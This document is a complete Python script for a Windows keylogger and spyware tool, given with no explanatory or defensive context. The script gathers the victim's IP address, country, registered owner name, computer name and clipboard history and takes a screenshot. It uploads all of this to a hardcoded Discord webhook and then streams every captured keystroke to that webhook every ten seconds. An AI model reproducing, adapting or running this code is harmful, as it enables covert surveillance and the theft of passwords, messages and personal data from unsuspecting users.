import os
import tempfile
import requests
import socket
import json
import subprocess
import platform
import ctypes
import time
import threading
import logging
from datetime import datetime
from pynput import keyboard
from io import BytesIO
from PIL import ImageGrab  # pip install pillow
import winreg  # Windows registry access

# --- Configuration ---
WEBHOOK_URL = 'https://discord.com/api/webhooks/1393672051495014633/GgsHrhbTcfbCAq7mBrHFiglqnDNspTix1q7J9_558BaXXu8Va1K63GN_oeRebVtmTLk8'

TEMP_DIR = tempfile.gettempdir()
SCREENSHOT_PATH = os.path.join(TEMP_DIR, 'screenshot.png')
CLIPBOARD_HISTORY_PATH = os.path.join(TEMP_DIR, 'clipboard_history.txt')
LOG_PATH = os.path.join(TEMP_DIR, 'keylogger.txt')

SEND_INTERVAL = 10  # seconds for keystroke batch send

# Setup logging for debugging
logging.basicConfig(
    filename=LOG_PATH,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# --- Helper functions ---

def get_external_ip():
    try:
        response = requests.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text.strip()
    except Exception as e:
        logging.error(f"Failed to get external IP: {e}")
    return 'Unknown'

def get_registered_owner():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        value, _ = winreg.QueryValueEx(key, "RegisteredOwner")
        winreg.CloseKey(key)
        return value
    except Exception as e:
        logging.error(f"Failed to get registered owner: {e}")
        return "Unknown"

def get_computer_name():
    try:
        return socket.gethostname()
    except Exception as e:
        logging.error(f"Failed to get computer name: {e}")
        return "Unknown"

def get_country_from_ip(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}')
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown')
    except Exception as e:
        logging.error(f"Failed to get country from IP: {e}")
    return "Unknown"

def get_clipboard_content():
    # Uses powershell to get clipboard raw text (works on Windows)
    try:
        result = subprocess.run(['powershell', '-NoProfile', '-Command', 'Get-Clipboard -Raw'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            return result.stdout.strip()
    except Exception as e:
        logging.error(f"Failed to get clipboard content: {e}")
    return ""

def append_clipboard_history():
    clipboard_content = get_clipboard_content()
    if clipboard_content:
        with open(CLIPBOARD_HISTORY_PATH, 'a', encoding='utf-8') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"--- Clipboard entry at {timestamp} ---\n")
            f.write(clipboard_content + "\n\n")

def take_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(SCREENSHOT_PATH, 'PNG')
        logging.info("Screenshot saved")
    except Exception as e:
        logging.error(f"Failed to take screenshot: {e}")

def send_to_webhook(ip, country, owner, computer_name):
    try:
        with open(SCREENSHOT_PATH, 'rb') as f1, open(CLIPBOARD_HISTORY_PATH, 'rb') as f2:
            files = {
                'file1': ('screenshot.png', f1, 'image/png'),
                'file2': ('clipboard_history.txt', f2, 'text/plain')
            }
            payload = {
                "embeds": [
                    {
                        "title": "System Information",
                        "color": 3447003,
                        "fields": [
                            {"name": "IP Address", "value": ip, "inline": False},
                            {"name": "Country", "value": country, "inline": False},
                            {"name": "Registered Owner", "value": owner, "inline": False},
                            {"name": "Computer Name", "value": computer_name, "inline": False},
                            {"name": "Clipboard History", "value": "See attached clipboard_history.txt", "inline": False}
                        ],
                        "image": {"url": "attachment://screenshot.png"}
                    }
                ]
            }
            r = requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files)
            logging.info(f"Webhook system info sent, status code: {r.status_code}")
    except Exception as e:
        logging.error(f"Failed to send webhook system info: {e}")

# --- Keylogger ---

keystroke_data = ''
lock = threading.Lock()

def send_keystrokes_periodically():
    global keystroke_data
    while True:
        time.sleep(SEND_INTERVAL)
        with lock:
            if keystroke_data:
                try:
                    logging.info(f"Sending keystrokes: {keystroke_data}")
                    r = requests.post(WEBHOOK_URL, json={'content': keystroke_data})
                    logging.info(f"Keystrokes sent, status code: {r.status_code}")
                    keystroke_data = ''
                except Exception as e:
                    logging.error(f"Failed to send keystrokes: {e}")

def on_press(key):
    global keystroke_data
    try:
        with lock:
            if key == keyboard.Key.space:
                keystroke_data += ' '
            elif key == keyboard.Key.enter:
                keystroke_data += '\n'
            elif key == keyboard.Key.backspace:
                keystroke_data += '<BACKSPACE>'
            elif key == keyboard.Key.tab:
                keystroke_data += '<TAB>'
            else:
                if hasattr(key, 'char') and key.char is not None:
                    keystroke_data += key.char
        logging.debug(f"Keystroke buffer: {keystroke_data}")
    except Exception as e:
        logging.error(f"Error in keypress handler: {e}")

def start_keylogger():
    thread = threading.Thread(target=send_keystrokes_periodically, daemon=True)
    thread.start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- Main ---

def main():
    logging.info("Script started")

    ip = get_external_ip()
    owner = get_registered_owner()
    computer_name = get_computer_name()
    country = get_country_from_ip(ip)

    append_clipboard_history()
    take_screenshot()
    send_to_webhook(ip, country, owner, computer_name)

    start_keylogger()

if __name__ == '__main__':
    main()
